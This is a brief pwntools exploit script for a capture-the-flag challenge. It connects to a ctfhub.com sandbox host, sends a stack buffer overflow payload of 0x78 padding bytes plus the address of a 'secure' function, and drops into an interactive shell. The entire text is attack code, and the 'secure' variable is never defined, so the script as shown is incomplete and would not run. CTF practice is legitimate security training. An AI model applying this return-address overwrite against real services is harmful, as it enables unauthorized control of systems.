from pwn import *
sh = remote("challenge-6b645ec3ae118d11.sandbox.ctfhub.com", 29389)

elf = ELF("./rop")
elf_libc = ELF("./libc-2.27.so")


# payload = b'a'*0x78 + p64(secure)
payload = flat(b'a'*0x78, p64(secure))

sh.sendline(payload)
sh.interactive()

# 